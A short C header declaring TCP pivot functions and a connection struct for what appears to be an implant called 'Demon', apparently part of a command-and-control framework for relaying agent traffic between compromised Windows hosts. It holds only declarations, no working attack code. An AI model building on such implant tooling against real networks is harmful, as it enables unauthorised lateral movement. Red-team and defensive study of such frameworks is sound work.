#ifndef DEMON_PIVOT_TCP_H
#define DEMON_PIVOT_TCP_H

#include <winsock2.h>

#define MAX_TCP_PACKETS_PER_LOOP 30

typedef struct _TCP_PIVOT_DATA
{
    UINT32 DemonID;
    SOCKET Socket;

    struct _TCP_PIVOT_DATA* Next;
} TCP_PIVOT_DATA, *PTCP_PIVOT_DATA;

BOOL            TcpPivotListen  ( DWORD Port );
VOID            TcpPivotPush    ( VOID );
BOOL            TcpPivotWrite   ( DWORD AgentId, PBYTE Data, DWORD Length );
BOOL            TcpPivotRemove  ( DWORD AgentId );
PTCP_PIVOT_DATA TcpPivotGet     ( DWORD AgentId );

#endif
